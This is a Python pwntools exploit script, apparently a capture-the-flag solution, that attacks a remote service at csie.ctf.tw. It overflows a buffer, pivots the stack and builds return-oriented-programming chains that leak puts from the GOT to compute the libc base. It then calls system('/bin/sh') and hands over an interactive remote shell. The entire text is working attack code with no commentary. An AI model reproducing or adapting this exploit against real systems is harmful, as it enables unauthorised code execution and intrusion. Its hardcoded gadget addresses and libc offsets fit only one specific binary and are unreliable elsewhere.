#!/usr/bin/env python
from pwn import *

r = remote("csie.ctf.tw",10132)

buf1 = 0x00602000 - 0x200
buf2 = buf1 + 0x100

context.arch = "amd64"

pop_rdi = 0x00000000004006b3
pop_rdx = 0x00000000004006d4
pop_rsi_r15 = 0x00000000004006b1
leave_ret = 0x000000000040064a
read_plt = 0x4004e0
puts_plt = 0x4004d8
puts_got = 0x00000000600fd8

payload = "a"*48
payload += flat([buf1,pop_rdi,0,pop_rsi_r15,buf1,0,pop_rdx,0x100,read_plt,leave_ret])
r.recvuntil(":")
r.send(payload)
#print len(payload)

rop = flat([buf2,pop_rdi,puts_got,puts_plt,pop_rsi_r15,buf2,0,pop_rdi,0,pop_rdx,0x100,read_plt,leave_ret])
r.sendline(rop)
#print len(rop)
r.recvuntil("\n")
puts_off = 0x6f690
puts_adr = u64(r.recvuntil("\n").strip().ljust(8,"\x00"))
libc = puts_adr - puts_off
print hex(libc)

system_off = 0x45390
system = system_off + libc
rop2 = flat([buf1,pop_rdi,buf2+32,system,"/bin/sh\x00"])
r.send(rop2)

r.interactive()
